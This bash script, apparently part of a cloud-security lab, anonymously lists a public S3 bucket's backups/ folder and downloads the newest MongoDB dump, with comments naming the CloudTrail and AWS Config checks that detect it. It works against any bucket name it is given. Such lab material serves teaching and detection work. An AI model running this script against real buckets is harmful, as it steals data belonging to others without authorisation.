#!/usr/bin/env bash
# ATTACK: anonymously list and download the MongoDB backups from the public bucket.
# No AWS account or credentials are used (--no-sign-request).
#
# DETECTED BY: CloudTrail S3 data events on the bucket; AWS Config rule
#   s3-bucket-public-read-prohibited reports the bucket NON_COMPLIANT.
set -euo pipefail

BUCKET="${1:?usage: 01_public_bucket_access.sh <backup-bucket-name> [region]}"
REGION="${2:-us-east-1}"

echo "[*] Anonymous LIST of s3://$BUCKET/backups/ (no credentials):"
aws s3 ls "s3://$BUCKET/backups/" --no-sign-request --region "$REGION" || true

echo "[*] Anonymous DOWNLOAD of the most recent dump:"
KEY=$(aws s3 ls "s3://$BUCKET/backups/" --no-sign-request --region "$REGION" \
  | sort | tail -1 | awk '{print $4}')
if [ -n "${KEY:-}" ]; then
  aws s3 cp "s3://$BUCKET/backups/$KEY" "/tmp/$KEY" --no-sign-request --region "$REGION"
  echo "[+] Exfiltrated /tmp/$KEY - a full MongoDB dump, pulled with NO AWS account."
else
  echo "[!] No backups listed yet (the VM runs the first dump at boot + daily at 03:00 UTC)."
fi
